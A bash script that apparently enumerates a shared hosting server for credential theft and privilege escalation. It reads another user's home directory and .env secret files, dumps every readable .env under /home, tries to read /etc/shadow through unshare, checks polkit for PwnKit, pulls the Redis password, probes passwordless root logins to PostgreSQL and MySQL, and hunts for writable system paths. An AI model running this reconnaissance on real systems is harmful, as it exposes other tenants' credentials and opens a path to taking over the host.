#!/bin/bash

echo "=== AWARE-MINIMUM-NUW (world-readable) ==="
ls -la /home/aware-minimum-nuw/
find /home/aware-minimum-nuw -readable -type f 2>/dev/null
cat /home/aware-minimum-nuw/.env 2>/dev/null
cat /home/aware-minimum-nuw/public_html/.env 2>/dev/null

echo "=== UNSHARE TESTS ==="
unshare --user --map-root-user cat /etc/shadow 2>&1
unshare --user --map-root-user cat /etc/yum.repos.d/virtualmin.repo 2>&1

echo "=== PWNKIT CHECK ==="
rpm -q polkit
rpm -q --changelog polkit 2>/dev/null | head -20

echo "=== REDIS ==="
redis-cli INFO server 2>/dev/null | head -10
redis-cli CONFIG GET requirepass 2>/dev/null

echo "=== POSTGRESQL ==="
psql -U postgres -h 127.0.0.1 -c "SELECT 1" 2>&1

echo "=== MYSQL ==="
mysql -u root -h 127.0.0.1 -e "SELECT 1" 2>&1

echo "=== TU .ENV ==="
cat ~/public_html/.env 2>/dev/null

echo "=== OTHER READABLE .ENV FILES ==="
find /home -maxdepth 3 -readable -name ".env" -exec echo "--- {} ---" \; -exec cat {} \; 2>/dev/null

echo "=== WRITABLE FILES OUTSIDE HOME ==="
find /etc /var/www /opt -writable 2>/dev/null | head -20

echo "=== WEAK FILE PERMISSIONS ==="
find /home -maxdepth 3 -perm -o+r -name "*.conf" -o -perm -o+r -name "*.ini" -o -perm -o+r -name "*.yaml" -o -perm -o+r -name "*.yml" 2>/dev/null | head -20

echo "=== DONE ==="
